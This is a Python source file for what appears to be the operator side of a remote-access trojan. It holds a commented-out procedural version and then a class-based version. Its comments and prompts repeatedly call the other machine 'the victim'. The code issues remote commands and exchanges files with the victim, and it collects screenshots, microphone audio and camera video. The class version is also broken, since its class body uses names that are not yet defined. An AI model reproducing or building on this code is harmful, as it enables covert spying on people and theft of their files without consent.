# import socket
# from _thread import *
# import threading


# s = socket.socket()
# s.bind(('127.0.0.1', 7613))
# s.listen(1)
# server_socket, adress = s.accept()
#
#
# def receive_file_from_client(x):
#     if x:
#         file_path = "C:\\C projects\\CMD_Text.txt"
#
#     else:
#         # Take from the victim file
#         file_path = input("Where do you want save the file?\n")
#
#     with open(file_path, 'wb')as f:
#         print('Open File')
#         while True:
#             data = server_socket.recv(1024)
#             if not data or len(data) < 1024:
#                 if data:
#                     f.write(data)
#                 f.flush()
#                 f.close()
#                 break
#             f.write(data)
#
#
# def send_file_to_client(data):
#     # Send to the victim files
#     victim_path = input('Where do you want save the file\n')
#     server_socket.sendall(victim_path.encode('utf-8'))
#     f = open(data, 'rb')
#     while True:
#         content = f.read(1024)
#         if content:
#             server_socket.sendall(content)
#         else:
#             f.close()
#             break
#
#
# def server():
#     print("Connection from: " + str(adress))
#
#     while True:
#         command = input('Please enter a command to the victim\n')
#         server_socket.send(command.encode('utf-8'))
#
#         if command.startswith('get file '):
#             receive_file_from_client(False)
#
#
#         elif command.startswith("cmd"):
#             receive_file_from_client(True)
#             file_content = ''
#             with open("C:\\C projects\\CMD_Text.txt") as file:
#                 for line in file.readlines():
#                     file_content += line
#             print(file_content)
#
#
#
#         elif command.startswith('download file '):
#             command = command[14:-1] + command[-1]
#             send_file_to_client(command)
#
#
#         elif command.startswith('send email '):
#             data = server_socket.recv(1024).decode('utf-8')
#             print(data)
#
#         elif command.startswith('take record '):
#             command = command[12:-1] + command[-1]
#             server_socket.sendall(command.encode('utf-8'))
#             path = input("Where do you want save the file on victim computer\n")
#             server_socket.sendall(path.encode('utf-8'))
#             receive_file_from_client(False)
#
#         elif command.startswith('take screenshot '):
#             receive_file_from_client(False)
#
#
#         elif command == 'exit':
#             break
#
#         elif command.startswith('listen'):
#             receive_file_from_client(False)
#
#         elif command.startswith('take mic output'):
#             receive_file_from_client(False)
#
#         elif command.startswith("take camera video"):
#             receive_file_from_client(False)
#
#         else:
#             data = server_socket.recv(1024).decode('utf-8')
#             print(data)
#
#     server_socket.close()
#
#
# if __name__ == '__main__':
#     server()


import socket
from _thread import *
import threading


class Server:
    port = None
    ip = None
    listen_count = None

    def __init__(self, port, ip, listen_count):
        self.port = port
        self.ip = ip
        self.listen_count = listen_count

    s = socket.socket()
    s.bind((ip, port))
    s.listen(listen_count)
    server_socket, adress = s.accept()

    def receive_file_from_client(self, auto_saving):
        if auto_saving:
            file_path = "C:\\C projects\\CMD_Text.txt"

        else:
            # Take from the victim file
            file_path = input("Where do you want save the file?\n")

        with open(file_path, 'wb')as f:
            print('Open File')
            while True:
                data = self.server_socket.recv(1024)
                if not data or len(data) < 1024:
                    if data:
                        f.write(data)
                    f.flush()
                    f.close()
                    break
                f.write(data)

    def send_file_to_client(self, data):
        # Send to the victim files
        victim_path = input('Where do you want save the file\n')
        self.server_socket.sendall(victim_path.encode('utf-8'))
        f = open(data, 'rb')
        while True:
            content = f.read(1024)
            if content:
                self.server_socket.sendall(content)
            else:
                f.close()
                break

    def server(self):
        print("Connection from: " + str(self.adress))

        while True:
            command = input('Please enter a command to the victim\n')
            self.server_socket.send(command.encode('utf-8'))

            if command.startswith('get file '):
                self.receive_file_from_client(False)


            elif command.startswith("cmd"):
                self.receive_file_from_client(True)
                file_content = ''
                with open("C:\\C projects\\CMD_Text.txt") as file:
                    for line in file.readlines():
                        file_content += line
                print(file_content)



            elif command.startswith('download file '):
                command = command[14:-1] + command[-1]
                self.send_file_to_client(command)


            elif command.startswith('send email '):
                data = self.server_socket.recv(1024).decode('utf-8')
                print(data)

            elif command.startswith('take record '):
                command = command[12:-1] + command[-1]
                self.server_socket.sendall(command.encode('utf-8'))
                path = input("Where do you want save the file on victim computer\n")
                self.server_socket.sendall(path.encode('utf-8'))
                self.receive_file_from_client(False)

            elif command.startswith('take screenshot '):
                self.receive_file_from_client(False)


            elif command == 'exit':
                break

            elif command.startswith('listen'):
                self.receive_file_from_client(False)

            elif command.startswith('take mic output'):
                self.receive_file_from_client(False)

            elif command.startswith("take camera video"):
                self.receive_file_from_client(False)

            else:
                data = self.server_socket.recv(1024).decode('utf-8')
                print(data)

        self.server_socket.close()


server = Server(7613, "127.0.0.1", 1)
